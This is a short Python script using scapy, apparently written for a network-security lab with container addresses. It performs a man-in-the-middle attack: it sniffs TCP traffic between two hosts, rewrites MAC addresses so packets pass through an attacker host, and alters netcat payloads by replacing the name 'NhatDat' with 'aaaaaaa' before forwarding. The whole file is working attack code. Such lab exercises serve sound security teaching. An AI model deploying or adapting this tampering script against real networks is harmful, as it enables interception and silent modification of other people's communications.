#!/usr/bin/env python3
from scapy.all import *

# Khai bao ip va mac
A = '10.9.0.5'
A_mac ='02:42:0a:09:00:05'
B ='10.9.0.6'
B_mac = '02:42:0a:09:00:06'
M = '10.9.0.105'
M_mac = '02:42:0a:09:00:69'

def tcp_spoof_pkt_netcat(pkt):
	if pkt[Ether].src != M_mac:
		print("not from M_mac")
		if pkt[IP].src == A and pkt[IP].dst == B:
			print("from A to B")
			pkt[Ether].src = M_mac
			pkt[Ether].dst = B_mac

			try:
				payload = bytes(pkt[TCP].payload).decode("utf-8")
				del (pkt[TCP].payload)
				del (pkt[TCP].chksum)
				print(payload)
				payload = censor_payload(payload)
				print(payload)
				pkt[TCP] /= payload

			except AttributeError:
				print("not str")

			finally:
				sendp(pkt)

		elif pkt[IP].src == B and pkt[IP].dst == A:
			print("from B to A")
			pkt[Ether].src = M_mac
			pkt[Ether].dst = A_mac
			sendp(pkt) # Forward the original packet

def censor_payload(payload):
	print(0)
	payload = list(payload)
	new_payload = payload.copy()
	name_len = len(first_name)
	print(1)
	for i in range(len(payload)-name_len+1):
		if payload[i:i+name_len] == first_name:
			print(2)
			new_payload[i:i+name_len] = replacement_txt
	return "".join(new_payload)

first_name = list("NhatDat")
replacement_txt = list("aaaaaaa")
pkt = sniff(filter='tcp', prn=tcp_spoof_pkt_netcat)
